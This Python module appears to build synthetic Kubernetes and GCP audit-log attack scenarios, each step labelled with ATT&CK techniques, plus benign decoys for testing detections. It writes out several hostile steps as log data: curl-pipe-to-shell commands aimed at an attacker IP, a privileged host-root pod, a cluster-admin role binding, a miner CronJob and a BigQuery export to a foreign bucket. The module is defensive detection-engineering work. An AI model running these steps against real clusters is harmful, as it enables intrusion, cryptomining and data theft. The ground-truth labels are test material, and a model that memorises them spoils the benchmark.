"""Attack stories and near-miss decoys for gen_k8s_and_gcp.py (Kubernetes + GCP). ATT&CK v20 labels.

Every step owns its events; its ground truth comes from its FIRST event (ts + entities exactly as Stage 1 maps them,
k8s_gcp_feeds.entity). Attacker infrastructure is 203.0.113.0/24 only (common.py address plan).
Stories are modelled on public Kubernetes / GCP attack research (Microsoft Threat Matrix for Kubernetes, Datadog
Stratus Red Team gcp.* / k8s.* techniques, Unit 42 Kubernetes reports); every name and IP is fake.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any

from cloud_attacks import formats as fm
from cloud_attacks import k8s_gcp_feeds as kf
from cloud_attacks.common import DAY, HOUR, MIN, PROJ_DATA, PROJ_PROD, START_MS, Ev, Rand, iso_s, sub_rng

ACCT = "111122223333"


def at(day: int, hour: int, minute: int = 0) -> int:
    return START_MS + day * DAY + hour * HOUR + minute * MIN


def eks_user(u: str, role: str = "eks-devs") -> str:
    return f"arn:aws:sts::{ACCT}:assumed-role/{role}/{u}"


def gcp_ev(r: Rand, ts: int, project: str, principal: str, ip: str, svc: str, method: str, res: str, *,
           log: str = "activity", code: int = 0, request: dict | None = None, metadata: dict | None = None,
           metadata_json: dict | None = None, rtype: str = "project", ua: str = fm.UA_GCLOUD) -> Ev:
    ev = fm.gcp(r, ts, project, principal, ip, svc, method, res, method, resource={"type": rtype, "labels": {}},
                data_access=log == "data_access", denied=bool(code), ua=ua, request=request)
    pp = ev.doc["protoPayload"]
    if code and code != 7:
        pp["status"] = {"code": code, "message": "FAILED_PRECONDITION"}
    if metadata is not None:
        pp["metadata"] = metadata
    if metadata_json is not None:
        pp["metadataJson"] = json.dumps(metadata_json)
    if log not in ("activity", "data_access"):
        ev.doc["logName"] = f"projects/{project}/logs/cloudaudit.googleapis.com%2F{log}"
    return ev


def bq_job(kind: str, *, dest: str | None = None, billed: int | None = None, tables: int = 1) -> dict[str, Any]:
    job: dict[str, Any] = {"jobName": "projects/p/jobs/x", "jobConfig": {"type": kind},
                           "jobStatus": {"jobState": "DONE"}}
    if dest:
        job["jobConfig"]["extractConfig"] = {"destinationUris": [dest],
                                             "sourceTable": f"projects/{PROJ_DATA}/datasets/sales/tables/orders"}
    if billed is not None:
        job["jobStats"] = {"queryStats": {"totalBilledBytes": str(billed), "referencedTables": [
            f"projects/{PROJ_DATA}/datasets/sales/tables/t{i}" for i in range(tables)]}}
    return {"@type": "type.googleapis.com/google.cloud.audit.BigQueryAuditMetadata",
            "jobChange": {"after": "DONE", "job": job}}


def table_read(r: Rand, ts: int, principal: str, ip: str, table: str) -> Ev:
    return gcp_ev(r, ts, PROJ_DATA, principal, ip, "bigquery.googleapis.com", "google.cloud.bigquery.v2.TableDataService.List",
                  f"projects/{PROJ_DATA}/datasets/sales/tables/{table}", log="data_access",
                  metadata={"@type": "type.googleapis.com/google.cloud.audit.BigQueryAuditMetadata",
                            "tableDataRead": {"reason": "JOB", "jobName": "projects/p/jobs/x"}})


def vpcsc(r: Rand, ts: int, principal: str, ip: str, obj: str, *, egress: bool) -> Ev:
    md: dict[str, Any] = {"@type": "type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata",
                          "securityPolicyInfo": {"servicePerimeterName": "accessPolicies/1234/servicePerimeters/data",
                                                 "organizationId": "123456789012"},
                          "violationReason": "RESOURCES_NOT_IN_SAME_SERVICE_PERIMETER" if egress
                          else "NETWORK_NOT_IN_SAME_SERVICE_PERIMETER"}
    if egress:
        md["egressViolations"] = [{"servicePerimeter": "accessPolicies/1234/servicePerimeters/data",
                                   "source": "projects/555000111", "targetResource": "projects/999000777"}]
    return gcp_ev(r, ts, PROJ_DATA, principal, ip, "storage.googleapis.com", "google.storage.objects.create",
                  f"projects/_/buckets/{obj}", log="policy", code=7, metadata=md)


@dataclass
class Step:
    technique_id: str
    tactic: str
    events: list[Ev]
    what: str

    def gt(self, n: int) -> dict[str, Any]:
        a = min(self.events, key=lambda e: (e.ts, e.rid))
        ent = kf.entity(a)
        return {"step": n, "ts_ms": a.ts, "ts": iso_s(a.ts), "technique_id": self.technique_id, "tactic": self.tactic,
                "host": ent["host"], "user": ent["user"], "src_ip": ent["src_ip"], "dst_ip": None,
                "source": f"{kf.CONNECTOR[a.feed]}:{ent['action']}", "event_id": a.rid, "events": len(self.events),
                "what": self.what}


@dataclass
class Story:
    id: str
    name: str
    clouds: tuple[str, ...]
    steps: list[Step]
    extra: list[Ev] = field(default_factory=list)

    def events(self) -> list[Ev]:
        return [e for s in self.steps for e in s.events] + self.extra

    def gt(self) -> dict[str, Any]:
        return {"id": self.id, "name": self.name, "clouds": list(self.clouds), "novel": False,
                "refs": ["https://microsoft.github.io/Threat-Matrix-for-Kubernetes/",
                         "https://github.com/DataDog/stratus-red-team (Apache-2.0)"],
                "steps": [s.gt(i + 1) for i, s in enumerate(self.steps)]}


def k1_eks_stolen_session(seed: int) -> Story:
    r, ip, u = sub_rng(seed, "K1"), "203.0.113.21", eks_user("tgupta")
    t = at(4, 14, 5)
    init = [kf.k8s(r, t + i * 7000, u, v, res, ns="payments", ip=ip) for i, (v, res) in
            enumerate([("get", "pods"), ("list", "pods"), ("get", "deployments")])]
    disc = [kf.k8s(r, t + 2 * MIN + i * 3000, u, "create" if res.startswith("self") else "list", res,
                   ns="payments" if res.startswith("self") else None, ip=ip, code=403 if res == "secrets" else 200)
            for i, res in enumerate(["selfsubjectrulesreviews", "secrets", "clusterrolebindings", "clusterroles",
                                     "nodes", "serviceaccounts", "namespaces", "roles"])]
    sec = [kf.k8s(r, t + 6 * MIN + i * 4000, u, "get", "secrets", ns=ns, name=nm, ip=ip,
                  code=403 if ns == "kube-system" and i % 2 else 200)
           for i, (ns, nm) in enumerate([("payments", "db-creds"), ("payments", "stripe-key"), ("shop", "redis-auth"),
                                         ("shop", "tls-shop"), ("data", "bq-sa-key"), ("data", "warehouse-pw"),
                                         ("kube-system", "aws-node-token"), ("kube-system", "bootstrap-token-ab12"),
                                         ("kube-system", "cluster-autoscaler-token"), ("payments", "jwt-signing"),
                                         ("monitoring", "grafana-admin"), ("ci", "registry-push")])]
    tok = [kf.k8s(r, t + 11 * MIN, u, "create", "serviceaccounts", ns="kube-system", name="cluster-autoscaler",
                  sub="token", ip=ip, code=201)]
    crb = [kf.k8s(r, t + 14 * MIN, u, "create", "clusterrolebindings", name="ops-debug", ip=ip, code=201,
                  req={"kind": "ClusterRoleBinding", "apiVersion": "rbac.authorization.k8s.io/v1",
                       "metadata": {"name": "ops-debug"},
                       "subjects": [{"kind": "ServiceAccount", "name": "default", "namespace": "default"}],
                       "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole",
                                   "name": "cluster-admin"}})]
    return Story("K1", "EKS: stolen developer session -> RBAC discovery -> secrets sweep -> SA token -> cluster-admin",
                 ("aws", "k8s"), [
                     Step("T1078.004", "Initial Access", init, "kubectl from a network tgupta never used"),
                     Step("T1613", "Discovery", disc, "can-i + RBAC / node / secret enumeration burst"),
                     Step("T1552.007", "Credential Access", sec, "12 secrets read across 5 namespaces"),
                     Step("T1528", "Credential Access", tok, "TokenRequest for kube-system/cluster-autoscaler"),
                     Step("T1098.006", "Privilege Escalation", crb, "ClusterRoleBinding default/default -> cluster-admin")])


def k2_aks_anonymous(seed: int) -> Story:
    r, ip, u = sub_rng(seed, "K2"), "203.0.113.33", "system:anonymous"
    t = at(5, 2, 10)
    a = dict(ip=ip, shape="aks", ua="python-requests/2.31.0")
    init = [kf.k8s(r, t + i * 5000, u, "list", res, **a) for i, res in enumerate(["pods", "services", "deployments"])]
    root = {"kind": "Pod", "apiVersion": "v1", "metadata": {"name": "node-debug", "namespace": "default"},
                  "spec": kf.pod_spec(image="docker.io/library/alpine:3.20", priv=True, host_pid=True, host_net=True,
                                      host_path="/")}
    esc = [kf.k8s(r, t + 4 * MIN, u, "create", "pods", ns="default", name="node-debug", code=201, req=root, **a)]
    cmd = ("?command=chroot&command=%2Fhost&command=sh&command=-c&command=curl+-s+http%3A%2F%2F203.0.113.33%2Fk+%7C+sh"
           "&container=main&stderr=true&stdout=true")
    ex_uri = "/api/v1/namespaces/default/pods/node-debug/exec" + cmd
    exe = [kf.k8s(r, t + 6 * MIN, u, "create", "pods", ns="default", name="node-debug", sub="exec", code=101,
                  uri=ex_uri, stage=st, audit_id=f"k2-exec-{seed}", **a) for st in ("RequestReceived", "ResponseComplete")]
    cj = {"kind": "CronJob", "apiVersion": "batch/v1", "metadata": {"name": "kube-cleanup", "namespace": "kube-system"},
          "spec": {"schedule": "*/10 * * * *", "jobTemplate": {"spec": {"template": {"spec": kf.pod_spec(
              image="docker.io/xmrig/xmrig:6.21.0", cmd=["sh", "-c", "curl -s http://203.0.113.33/m | sh"])}}}}}
    per = [kf.k8s(r, t + 9 * MIN, u, "create", "cronjobs", ns="kube-system", name="kube-cleanup", code=201, req=cj, **a)]
    return Story("K2", "AKS: anonymous API access -> host-root privileged pod -> exec curl|sh -> miner CronJob",
                 ("azure", "k8s"), [
                     Step("T1078.001", "Initial Access", init, "system:anonymous lists pods / services / deployments"),
                     Step("T1611", "Privilege Escalation", esc, "privileged + hostPID + hostPath / pod node-debug"),
                     Step("T1609", "Execution", exe, "exec chroot /host curl | sh"),
                     Step("T1053.007", "Persistence", per, "CronJob kube-cleanup in kube-system runs xmrig")])


def g1_gke_to_bigquery(seed: int) -> Story:
    r, ip, p = sub_rng(seed, "G1"), "203.0.113.41", "lfernandes@corp.example"
    t = at(5, 10, 30)
    exe = [kf.gke(r, t, PROJ_DATA, p, "io.k8s.core.v1.pods.exec.create",
                  "core/v1/namespaces/analytics/pods/jupyter-0/exec", ip)]
    col = [gcp_ev(r, t + 6 * MIN, PROJ_DATA, p, ip, "bigquery.googleapis.com",
                  "google.cloud.bigquery.v2.JobService.InsertJob", f"projects/{PROJ_DATA}/jobs/bqjob_r1", log="data_access",
                  metadata=bq_job("QUERY", billed=128 * 1024 ** 3, tables=6))] + \
        [table_read(r, t + 7 * MIN + i * 20_000, p, ip, f"t{i}") for i in range(14)]
    blk = [vpcsc(r, t + 15 * MIN + i * 40_000, p, ip, f"drop-7781-bkt/objects/part-{i}.csv", egress=True)
           for i in range(4)]
    exf = [gcp_ev(r, t + 20 * MIN, PROJ_DATA, p, ip, "bigquery.googleapis.com", "jobservice.jobcompleted",
                  f"projects/{PROJ_DATA}/jobs/bqjob_x9", log="data_access",
                  metadata_json=bq_job("EXTRACT", dest="gs://drop-7781-ext/orders-*.csv.gz"))]
    wif = [gcp_ev(r, t + 26 * MIN, PROJ_DATA, p, ip, "iam.googleapis.com",
                  "google.iam.v1.WorkloadIdentityPools.CreateWorkloadIdentityPoolProvider",
                  f"projects/{PROJ_DATA}/locations/global/workloadIdentityPools/partners/providers/sync",
                  request={"@type": "type.googleapis.com/google.iam.v1.CreateWorkloadIdentityPoolProviderRequest",
                           "workloadIdentityPoolProviderId": "sync",
                           "workloadIdentityPoolProvider": {"oidc": {"issuerUri": "https://idp.sync-partner.example"},
                                                            "attributeMapping": {"google.subject": "assertion.sub"}}})]
    return Story("G1", "GKE exec with stolen data-engineer credentials -> BigQuery bulk read -> VPC-SC blocked copy -> "
                 "BigQuery export to a foreign bucket -> rogue workload identity provider", ("gcp", "k8s"), [
                     Step("T1609", "Execution", exe, "first-ever exec by lfernandes into analytics/jupyter-0 (GKE)"),
                     Step("T1213.006", "Collection", col, "128 GiB query + 14 tables read"),
                     Step("T1537", "Exfiltration", blk, "4 copies to an outside project blocked by VPC-SC"),
                     Step("T1537", "Exfiltration", exf, "EXTRACT job to gs://drop-7781-ext (metadataJson shape)"),
                     Step("T1484.002", "Privilege Escalation", wif, "WIF provider trusting idp.sync-partner.example")])


def g2_vm_miner_dns(seed: int) -> Story:
    r, vm, vip, c2 = sub_rng(seed, "G2"), "db-backup-1", "10.128.0.22", "203.0.113.62"
    t = at(6, 1, 0)
    extra = [kf.fw(r, t - 30 * MIN + i * 9000, PROJ_PROD, "203.0.113.61", vip, port, vm, allowed=port == 22,
                   rule="allow-ssh" if port == 22 else "default-deny-ingress") for i, port in enumerate([3389, 23, 22])]
    extra.append(kf.scc(r, t + 40 * MIN, PROJ_PROD, "Execution: Cryptocurrency Mining Combined Detection", "CRITICAL",
                        "IMPACT", ["RESOURCE_HIJACKING"], f"//compute.googleapis.com/projects/{PROJ_PROD}/zones/"
                        f"asia-south1-a/instances/{vm}"))
    mine = [kf.flow(r, t + 20 * MIN + i * 2 * MIN, PROJ_PROD, vip, c2, 3333, src_vm=vm, nbytes=r.randint(2000, 9000))
            for i in range(45)]
    labels = [r.b32(40).lower() for _ in range(70)]
    tun = [kf.dns(r, t + 60 * MIN + i * 25_000, PROJ_PROD, vm, vip, f"{lab}.t1.exfil-cdn.example", qtype="TXT",
                  rcode="NXDOMAIN" if i % 3 else "NOERROR") for i, lab in enumerate(labels)]
    return Story("G2", "Compromised backup VM: SSH in -> Monero miner on stratum 3333 -> DNS TXT tunnel", ("gcp",), [
        Step("T1496.001", "Impact", mine, "45 flows from db-backup-1 to 203.0.113.62:3333"),
        Step("T1071.004", "Command and Control", tun, "70 long TXT names under exfil-cdn.example")], extra=extra)


def g3_serverless_backdoor(seed: int) -> Story:
    r, ip, p = sub_rng(seed, "G3"), "203.0.113.45", "pmehta@corp.example"
    t = at(6, 9, 0)
    dep = [gcp_ev(r, t, PROJ_PROD, p, ip, "cloudfunctions.googleapis.com",
                  "google.cloud.functions.v2.FunctionService.CreateFunction",
                  f"projects/{PROJ_PROD}/locations/asia-south1/functions/img-resize-2",
                  request={"@type": "type.googleapis.com/google.cloud.functions.v2.CreateFunctionRequest",
                           "function": {"name": "img-resize-2", "buildConfig": {"runtime": "python312"},
                                        "serviceConfig": {"serviceAccountEmail":
                                                          "555000111222-compute@developer.gserviceaccount.com"}}})]
    pub = [gcp_ev(r, t + 5 * MIN, PROJ_PROD, p, ip, "run.googleapis.com", "google.cloud.run.v1.Services.SetIamPolicy",
                  f"projects/{PROJ_PROD}/locations/asia-south1/services/img-resize-2",
                  request={"resource": "img-resize-2", "policy": {"bindings": [
                      {"role": "roles/run.invoker", "members": ["allUsers"]}]}})]
    return Story("G3", "Stolen gcloud token: function with the default compute SA -> public invoker backdoor", ("gcp",), [
        Step("T1648", "Execution", dep, "Cloud Function deployed with the Editor-level default compute SA"),
        Step("T1098.003", "Persistence", pub, "allUsers granted roles/run.invoker on the function")])


def build_stories(seed: int) -> list[Story]:
    return [k1_eks_stolen_session(seed), k2_aks_anonymous(seed), g1_gke_to_bigquery(seed), g2_vm_miner_dns(seed),
            g3_serverless_backdoor(seed)]


DECOYS = [  # (id, why) - every one is generated by the baseline (gen_k8s_and_gcp.benign_day); listed for reviewers
    ("D1", "ops engineers rnair / akumar exec into payments pods most days (known behaviour, context only)"),
    ("D2", "Argo CD reads repo credentials in 6 namespaces every hour (allow-listed operator, below threshold)"),
    ("D3", "CI (system:serviceaccount:ci:terraform) rolls out node-exporter with hostPID + /proc in monitoring"),
    ("D4", "asharma creates a GitHub Actions workload identity provider with an attribute condition"),
    ("D5", "nightly ETL service account EXTRACTs to gs://corp-exports (trusted destination)"),
    ("D6", "dsingh hits a VPC-SC ingress violation from home once a day (no egress)"),
    ("D7", "web VMs resolve random 32-hex names under cdn.partner.example (~8 per hour, below tunnel threshold)"),
    ("D8", "load balancer health probes /healthz /livez as system:anonymous (no resource)"),
]
